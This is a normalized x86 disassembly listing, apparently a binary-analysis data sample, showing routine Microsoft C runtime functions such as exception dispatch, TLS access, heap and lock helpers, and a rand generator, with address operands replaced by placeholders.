mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_41b8e8
push 0x8
push r--data
call sub_411a70
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_41b8c3
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41acd6
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_41b976
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411ab5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_41b8c3
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41acd6
jmp r-xdata
sub_41b976
push 0xc
push r--data
call sub_411a70
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ eax ]
mov edi [ ebp + 0xc ]
test edx edx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
push 0x1
test dl 0x8
je r-xdata
add edi 0xc
add edi ecx
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_415980
push 0x1
push edi
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ edi ] ecx
mov eax [ ebp + 0x14 ]
add eax 0x8
push eax
push ecx
push 0x1
push edi
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41bd5e
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_40f760
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
push [ esi + 0x18 ]
call sub_41bd5e
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_41b8c3
pop ecx
pop ecx
push eax
push edi
call sub_40f760
add esp 0xc
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_411ab5
retn
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_41b8c3
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_41bafb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_414adf
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_414adf
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_414adf
and [ eax + 0x90 ] 0x0
jmp sub_4159b8
sub_41bb49
push 0x10
push r--data
call sub_411a70
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41bc08
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_414adf
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_411ab5
retn
call sub_415980
call sub_415980
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_41af90
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41bc22
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_414adf
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
xor esi esi
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41b388
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41bb49
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bd01
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_4142a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_41bd70
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_41bd90
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_401050
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x0
pop ebp
retn
sub_402300
push ebp
mov ebp esp
push 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402280
add esp 0xc
pop ebp
retn
sub_402320
push ebp
mov ebp esp
push 0x1
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402280
add esp 0xc
pop ebp
retn
sub_402630
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_4025c0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] sub_402600
pop ebp
retn
sub_402650
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x10
push eax
call sub_401050
add esp 0x4
pop ebp
retn
sub_406570
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
push 0x30e
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40fda4
add esp 0xc
pop ebp
retn
sub_406900
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
pop ebp
retn
sub_40a180
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] 0x0
push 0x1
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40a120
add esp 0xc
pop ebp
retn
sub_40a940
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_40a950
push ebp
mov ebp esp
pop ebp
retn
sub_40aaa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dx [ ecx ]
mov [ eax ] dx
pop ebp
retn
sub_40ab70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ eax ] dl
pop ebp
retn
sub_40ab80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40aba0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40abc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov esp ebp
pop ebp
retn
sub_40ada0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40aba0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40adc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_40ae60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40abc0
mov esp ebp
pop ebp
retn
sub_40ae80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40ada0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40aea0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_40af40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40ae60
mov esp ebp
pop ebp
retn
sub_40af60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40ada0
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40af80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax r--data
mov esp ebp
pop ebp
retn
sub_40b040
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_40b050
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_40b340
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40b350
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40b720
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_40b5c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_41ab39
sub_40b5d1
mov esp ebp
pop ebp
retn
sub_40b6e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40b340
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40b720
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40b970
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_41ab0b
sub_40b981
mov esp ebp
pop ebp
retn
sub_40b990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call j_sub_40f691
add esp 0x4
mov esp ebp
pop ebp
retn 0x8
sub_40bd58
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40b2a0
push 0x0
push 0x0
call sub_41465e
mov eax sub_40bd7c
retn
sub_40bd7c
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_40bf98
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40b520
push 0x0
push 0x0
call sub_41465e
mov eax sub_40bfbc
retn
sub_40bfbc
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
sub_40c060
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c0e0
mov esp ebp
pop ebp
retn 0x4
sub_40c080
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_40c100
add esp 0x4
mov esp ebp
pop ebp
retn
sub_40c0a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c110
mov esp ebp
pop ebp
retn 0x4
sub_40c0c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_40c130
add esp 0x4
mov esp ebp
pop ebp
retn
sub_40c0e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_40c1c0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40c100
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_40c140
pop ebp
retn
sub_40c110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_40c200
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40c130
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_40c150
pop ebp
retn
sub_40c140
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
or eax 0xffffffff
mov esp ebp
pop ebp
retn
sub_40c150
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x7fffffff
mov esp ebp
pop ebp
retn
sub_40c1b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_40c260
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40c310
pop ebp
retn
sub_40c310
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn 0x4
sub_40c490
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
movzx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40d500
add esp 0xc
pop ebp
retn
j_sub_40c810
jmp sub_40c810
sub_40c810
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40b130
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_40ca30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
movzx eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_40caf0
mov esp ebp
pop ebp
retn 0x4
sub_40ca50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea eax [ eax + ecx * 2 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40ac40
mov esp ebp
pop ebp
retn
sub_40d4f0
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn
sub_40d540
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_410b21
add esp 0x4
pop ebp
retn
sub_40d560
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
movsx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412270
add esp 0xc
pop ebp
retn
sub_40d580
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn
sub_40f0f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40b390
add eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40f110
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40f220
mov esp ebp
pop ebp
retn 0x4
sub_40f180
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40b200
mov esp ebp
pop ebp
retn
sub_40f430
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40f470
mov esp ebp
pop ebp
retn 0x4
sub_40f450
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40f5a0
mov esp ebp
pop ebp
retn 0x4
sub_40fed5
call sub_4111a6
retn
sub_40ff91
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40fe9b
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_410169
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_410184
add esp 0x14
pop ebp
retn
sub_41020d
push esi
call sub_4118e8
pop ecx
retn
sub_410215
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_41134f
push 0x1
push 0x0
call sub_412b97
add esp 0xc
jmp sub_412bb6
call eax
j_sub_40f691
jmp sub_40f691
sub_410411
push esi
call sub_4118e8
pop ecx
retn
sub_410878
push esi
call sub_4118e8
pop ecx
retn
sub_410880
push ecx
mov [ ecx ] r--data
call sub_41432c
pop ecx
retn
sub_4109a6
push esi
call sub_4118e8
pop ecx
retn
sub_4109ae
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_414571
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4109c9
mov [ ecx ] r--data
jmp sub_414594
sub_410b04
push esi
call sub_4118e8
pop ecx
retn
sub_410b0c
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410a48
add esp 0xc
pop ebp
retn
sub_410b96
call sub_414adf
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_410bb9
push ebp
mov ebp esp
call sub_414adf
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_410cdc
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_414cfb
pop ecx
pop ecx
retn
sub_410cf0
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_411064
push esi
call sub_411113
sub_410d0a
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_411ab5
retn
sub_410d19
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_41134f
push 0xff
call sub_411032
call sub_4112f2
_start
call sub_4151be
jmp sub_410bc9
sub_410f08
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_410f43
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_411032
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_411000
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_411048
push ebp
mov ebp esp
call sub_4112f2
push [ ebp + 0x8 ]
call sub_41134f
pop ecx
push 0xff
call sub_411113
int3
sub_411064
push 0x1
push 0x1
push 0x0
call sub_4111af
add esp 0xc
retn
sub_411073
push 0x1
push 0x0
push 0x0
call sub_4111af
add esp 0xc
retn
sub_411113
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4111af
add esp 0xc
pop ebp
retn
sub_41119d
push 0x8
call sub_41569d
pop ecx
retn
sub_4111a6
push 0x8
call sub_415801
pop ecx
retn
sub_4112c9
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_415801
pop ecx
sub_4112de
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4111af
add esp 0xc
pop ebp
retn
sub_411766
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41184c
call sub_413c0a
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_40f691
and [ rw-data ] 0x0
pop ecx
retn
call sub_416684
sub_411a5e
push 0x1
call sub_415801
pop ecx
retn
sub_411ab5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_411d46
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_411c70
add esp 0xc
pop ebp
retn 0x4
sub_411d79
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_417025
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_411dab
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_411c70
add esp 0xc
pop ebp
retn 0x8
sub_4123df
push esi
call sub_417ba2
pop ecx
retn
sub_412b97
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_412bf9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41330d
push esi
call sub_417ba2
pop ecx
retn
sub_413c0a
push 0x1
call sub_413c13
pop ecx
retn
sub_413cbb
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_411922
pop ecx
pop ecx
retn
sub_413cee
push 0x1
call sub_415801
pop ecx
retn
sub_413db0
push esi
call sub_417ba2
pop ecx
retn
sub_413f1d
push edi
call sub_417ba2
pop ecx
retn
sub_414290
push 0xb
call sub_415801
pop ecx
retn
sub_414394
push 0xe
call sub_415801
pop ecx
retn
sub_41443e
push esi
call sub_417ba2
pop ecx
retn
sub_414556
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_414594
mov [ ecx ] r--data
jmp sub_414635
sub_414635
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_40f691
pop ecx
sub_414651
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_414aca
push 0xd
call sub_415801
pop ecx
retn
sub_414ad6
push 0xc
call sub_415801
pop ecx
retn
sub_414c07
push 0xd
call sub_415801
pop ecx
retn
sub_414c10
push 0xc
call sub_415801
pop ecx
retn
sub_414c8f
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_4156d1
push eax
call sub_415311
or [ rw-data ] 0xffffffff
pop ecx
sub_414ced
push sub_414cac
call sub_41560f
pop ecx
xor eax eax
retn
sub_415171
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4152f3
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_415311
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_415330
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41560f
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_41561d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_415632
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_415695
and [ rw-data ] 0x0
retn
sub_4157c3
push 0xa
call sub_415801
pop ecx
retn
sub_415801
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4158f9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_415961
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_4159a4
xor eax eax
inc eax
retn
sub_4159b8
push 0x8
push r--data
call sub_411a70
call sub_414adf
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_412bb6
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_4159d8
xor eax eax
inc eax
retn
sub_4159ec
call sub_414adf
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_4159b8
call eax
sub_4159ff
push sub_4159b8
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_415a10
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_415a1d
push [ rw-data ]
